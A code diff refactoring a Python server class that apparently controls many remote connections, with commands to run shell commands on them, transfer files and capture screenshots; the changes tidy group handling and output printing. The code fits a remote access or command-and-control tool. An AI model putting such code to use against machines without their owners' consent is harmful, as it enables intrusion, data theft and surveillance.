@@ -21,16 +21,16 @@ class Server:
 
                 if command == "h":
                     self.print_help()
-                elif command == "o" and len(attribute[0].split()) == 2:
-                    self.set_option(attribute[0].split()[0], attribute[0].split()[1])
+                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["cmd_timeout"]:
+                    self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                 elif command == "l" and len(attribute) == 1:
                     self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
                 elif command == "t" and len(attribute) == 2:
                     self.change_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                 elif command == "r" and len(attribute) == 1:
                     self.remove_connection(self.get_conn_fgoi(attribute[0].split()))
-                elif command == "g" and len(attribute) == 2 and attribute[0].split()[0] in ["add", "rm"]:
-                    self.edit_group(attribute[0].split()[0], self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1])
+                elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
+                    self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
                 elif command == "c" and len(attribute) == 2:
                     self.execute_command(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                 elif command == "d" and len(attribute) == 3:
@@ -98,23 +98,24 @@ class Server:
         for entry in remove_entries:
             self.connection.connections.remove(entry)
 
-    def edit_group(self, mode, connections, name):
-        mode = mode.lower()
+    def edit_group(self, mode, connections, group_names):
         if mode == "add":
             for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
                 if connection in connections:
-                    if name not in self.connection.connections[index][4]:
-                        self.connection.connections[index][4].append(name)
-                    else:
-                        print("[-] TargetAlreadyInGroup")
+                    for name in group_names:
+                        if name not in self.connection.connections[index][4]:
+                            self.connection.connections[index][4].append(name)
+                        else:
+                            print("[-] TargetAlreadyInGroup")
 
         elif mode == "rm":
             for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
                 if connection in connections:
-                    try:
-                        self.connection.connections[index][4].remove(name)
-                    except ValueError:
-                        print("[-] TargetNotInGroup")
+                    for name in group_names:
+                        try:
+                            self.connection.connections[index][4].remove(name)
+                        except ValueError:
+                            print("[-] TargetNotInGroup")
 
     def execute_command(self, command, connections):
         data = ("c" + str(self.cmd_timeout) + " " + command).encode(self.connection.CODEC)
@@ -123,8 +124,7 @@ class Server:
                 self.connection.send(data, connection)
                 print(self.connection.recv(connection).decode(self.connection.CODEC))
             except socket.error as error:
-                sys.stdout.write("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)) + "\n")
-                sys.stdout.flush()
+                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)) + "\n")
 
     def download_file(self, path_to_open, path_to_save, connections):
         for connection in connections:
@@ -139,15 +139,13 @@ class Server:
                     while not data.endswith(self.connection.END_MARKER):
                         data += connection.recv(self.connection.PACKET_SIZE)
                         len_data_current = len(data)
-                        sys.stdout.write("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
-                        sys.stdout.flush()
+                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
                     data = base64.b64decode(data[:-(len(self.connection.END_MARKER))])
                     with open(path_to_save, "wb") as file:
                         file.write(data)
-                        print()
             except socket.error as error:
-                sys.stdout.write("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)) + "\n")
-                sys.stdout.flush()
+                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))
+            print()
 
     def upload_file(self, path_to_open, path_to_save, connections):
         try:
@@ -166,12 +164,10 @@ class Server:
                         connection.send(data[:1024])
                         data = data[1024:]
                         len_data_current = len_data_total - len(data)
-                        sys.stdout.write("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
-                        sys.stdout.flush()
-                    print()
+                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
                 except socket.error as error:
-                    sys.stdout.write("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)) + "\n")
-                    sys.stdout.flush()
+                    self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))
+                print()
 
     def make_screenshot(self, monitor, path_to_save, connections):
         for connection in connections:
@@ -200,6 +196,10 @@ class Server:
         for index, (c, _, _, _, _) in enumerate(self.connection.connections):
             if connection == c:
                 return index
+
+    def update_line(self, text):
+        sys.stdout.write(text)
+        sys.stdout.flush()
 
 
 class Connection:
